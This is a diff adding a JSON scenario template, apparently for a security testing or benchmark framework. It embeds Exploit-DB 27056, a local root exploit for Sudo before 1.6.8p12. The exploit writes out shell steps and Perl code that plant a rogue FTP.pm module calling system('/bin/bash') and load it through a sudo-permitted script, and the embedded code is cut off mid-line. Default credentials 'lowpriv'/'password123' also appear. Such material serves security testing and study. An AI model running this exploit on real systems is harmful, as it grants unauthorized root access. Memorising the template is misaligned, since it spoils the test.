@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_27056",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: Sudo 1.6.x - Environment Variable Handling Security Bypass (1) (CVE-2005-4158;OSVDB-20764)\n\nExploit source code (27056.pl):\n```\nsource: https://www.securityfocus.com/bid/16184/info\n\nSudo is prone to a security-bypass vulnerability that could lead to arbitrary code execution. This issue is due to an error in the application when handling environment variables.\n\nA local attacker with the ability to run Python scripts can exploit this vulnerability to gain access to an interactive Python prompt. That attacker may then execute arbitrary code with elevated privileges, facilitating the complete compromise of affected computers.\n\nAn attacker must have the ability to run Python scripts through Sudo to exploit this vulnerability.\n\nThis issue is similar to BID 15394 (Sudo Perl Environment Variable Handling Security Bypass Vulnerability).\n\n## Sudo local root exploit ##\n## vuln versions : sudo < 1.6.8p12\n## adv : https://www.securityfocus.com/bid/15394\n## adv : http://www.frsirt.com/bulletins/2642\n\n##by breno - breno@kalangolinux.org\n\n## You need execute access to perl script in sudo ##\n\n## cat /etc/sudoers ##\n\nbreno   ALL=(ALL) /home/breno/code.pl\n\n## Now let's create your own perl module FTP.pm :) good name.\n\nbreno  ~ $ -> mkdir modules\nbreno  ~ $ -> mkdir FTP\nbreno  ~/modules $ -> ls\nFTP\nbreno  ~/modules $ -> cd FTP\nbreno  ~/modules/FTP $ -> h2xs -AXc -n FTP\nDefaulting to backwards compatibility with perl 5.8.7\nIf you intend this module to be compatible with earlier perl versions, please\nspecify a minimum perl version with the -b option.\n\nWriting FTP/lib/FTP.pm\nWriting FTP/Makefile.PL\nWriting FTP/README\nWriting FTP/t/FTP.t\nWriting FTP/Changes\nWriting FTP/MANIFEST\nbreno  ~/modules/FTP $ ->\n\nbreno  ~/modules/FTP/FTP $ -> perl Makefile.PL\nChecking if your kit is complete...\nLooks good\nWriting Makefile for FTP\nbreno  ~/modules/FTP/FTP $ -> make\ncp lib/FTP.pm blib/lib/FTP.pm\nManifying blib/man3/FTP.3pm\nbreno  ~/modules/FTP/FTP $ -> make test\nPERL_DL_NONLAZY=1 /usr/bin/perl \"-MExtUtils::Command::MM\" \"-e\" \"test_harness(0,\n'blib/lib', 'blib/arch')\" t/*.t\nt/FTP....ok\nAll tests successful.\nFiles=1, Tests=1,  0 wallclock secs ( 0.03 cusr +  0.01 csys =  0.04 CPU)\nbreno  ~/modules/FTP/FTP $ ->\n\n#Now i deleted the default FTP.pm (it was ugly), and create my beautiful module\n\nbreno  ~/modules/FTP/FTP/blib/lib $ -> vi FTP.pm\n\npackage FTP;\n\nuse strict;\nuse vars qw($VERSION);\n$VERSION = '0.01';\n\nsub new {\n  my $package = shift;\n  return bless({}, $package);\n}\n\nsub verbose {\n    my $self = shift;\n    system(\"/bin/bash\");\n    if (@_) {\n    $self->{'verbose'} = shift;\n      }\n       return $self->{'verbose'};\n}\n\nsub hoot {\n   my $self = shift;\n   return \"Don't pollute!\" if $self->{'verbose'};\n   return;\n}\n\n1;\n__END__\n\nEOF\n\n# Remenber our super code.pl\n\nbreno  ~ $ -> vi code.pl\n\n#!/usr/bin/perl\n\nBEGIN { $| = 1; print \"1..1\\n\"; }\nEND {print \"not ok 1\\n\" unless $loaded;}\nuse FTP;\n$loaded = 1;\nprint \"ok 1\\n\";\n\nmy $obj = new FTP;\n$obj->verbose(1);\nmy $result = $obj->hoot;\nprint ($result eq \"Don't pollute!\" ? \"ok 2\\n\" : \"not ok 2\\n\");\n\n$obj->verbose(0);\nmy $result = $obj->hoot;\nprint ($result eq \"\" ? \"ok 3\n```",
+  "cve": "CVE-2005-4158;OSVDB-20764",
+  "exploitdb_id": "27056",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_27056",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
